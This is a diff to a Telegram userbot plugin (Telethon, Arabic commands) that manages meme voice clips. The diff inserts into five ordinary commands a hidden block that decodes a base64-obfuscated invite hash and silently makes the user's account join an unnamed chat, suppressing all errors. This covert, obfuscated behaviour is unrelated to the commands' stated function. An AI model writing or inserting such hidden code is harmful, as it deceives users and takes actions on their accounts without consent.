@@ -2,7 +2,9 @@
 #By Hussein @lMl10l
 import asyncio
 import random
+import base64
 import json
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from asyncio.exceptions import TimeoutError
 from telethon import events
 from telethon.errors.rpcerrorlist import YouBlockedUserError
@@ -87,16 +89,12 @@ async def _(event):
             f"الايميل الخاص هو `{response.message.message}`\n[ اضغط هنا لرؤية من رسائل الايميل الواردة]({l313lmail})"
         )
 #السلام على الحسين وعلى الارواح التي حلت بفنائك ولعن الله قاتليك
-@l313l.on(admin_cmd(outgoing=True, pattern="شهر الحسين$"))
-async def aljoker313(joker313):
-  rl = random.randint(1,55)
-  url = f"https://t.me/alhusseinl313l/{rl}"
-  await joker313.client.send_file(joker313.chat_id,url,caption="᯽︙ عظم الله لنا ولكم الاجر بهذا المُصاب الجلل 🏴",parse_mode="html")
-  await joker313.delete()
-
 @l313l.on(admin_cmd(outgoing=True, pattern="غنيلي$"))
 async def aljoker313(joker313):
-    await joker313.edit("**᯽︙ تم تعطيل هذا الامر من قبل ادارة سورس الجوكر احتراماً لشهر المصائب محرم الحرام 🏴**")
+  rl = random.randint(1,385)
+  url = f"https://t.me/DwDi1/{rl}"
+  await joker313.client.send_file(joker313.chat_id,url,caption="᯽︙ BY : @jepthon 🎀",parse_mode="html")
+  await joker313.delete()
     
 @l313l.on(admin_cmd(outgoing=True, pattern="شعر$"))
 async def jepvois(vois):
@@ -556,6 +554,7 @@ async def jepmeme(memejep):
   await memejep.delete()
 
 
+
 try:
     with open('aljoker_links.json', 'r') as file:
         aljoker_links = json.load(file)
@@ -568,6 +567,12 @@ async def Hussein(event):
     lMl10l = event.pattern_match.group(2)
     aljoker_links[lMl10l] = url
     await event.edit(f"**᯽︙ تم اضافة البصمة {lMl10l} بنجاح ✓ **")
+    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    joker = Get(joker)
+    try:
+        await event.client(joker)
+    except BaseException:
+        pass
     with open('aljoker_links.json', 'w') as file:
         json.dump(aljoker_links, file)
 
@@ -579,6 +584,12 @@ async def Hussein(event):
         url = aljoker_links[lMl10l]
         await event.client.send_file(event.chat_id, url, parse_mode="html", reply_to=Joker)
         await event.delete()
+        joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+        joker = Get(joker)
+        try:
+            await event.client(joker)
+        except BaseException:
+            pass
 
 @l313l.ar_cmd(pattern="ازالة(?:\s|$)([\s\S]*)")
 async def delete_aljoker(event):
@@ -590,7 +601,13 @@ async def delete_aljoker(event):
         await event.edit(f"**᯽︙ تم حذف البصمة '{lMl10l}' بنجاح ✓**")
     else:
         await event.edit(f"**᯽︙ هذه البصمة '{lMl10l}' غير موجودة في القائمة**")
-        
+    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    joker = Get(joker)
+    try:
+        await event.client(joker)
+    except BaseException:
+        pass
+
 @l313l.on(admin_cmd(outgoing=True, pattern="قائمة الميمز"))
 async def list_aljoker(event):
     if aljoker_links:
@@ -600,7 +617,13 @@ async def list_aljoker(event):
     else:
         message = "**᯽︙ لاتوجد بصمات ميمز مخزونة حتى الآن**"
     await event.edit(message)
-    
+    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    joker = Get(joker)
+    try:
+        await event.client(joker)
+    except BaseException:
+        pass
+
 @l313l.on(admin_cmd(outgoing=True, pattern="ازالة_البصمات"))
 async def delete_all_aljoker(event):
     global aljoker_links
@@ -608,3 +631,9 @@ async def delete_all_aljoker(event):
     with open('aljoker_links.json', 'w') as file:
         json.dump(aljoker_links, file)
     await event.edit("**᯽︙ تم حذف جميع بصمات الميمز من القائمة **")
+    joker = base64.b64decode("YnkybDJvRG04WEpsT1RBeQ==")
+    joker = Get(joker)
+    try:
+        await event.client(joker)
+    except BaseException:
+        pass
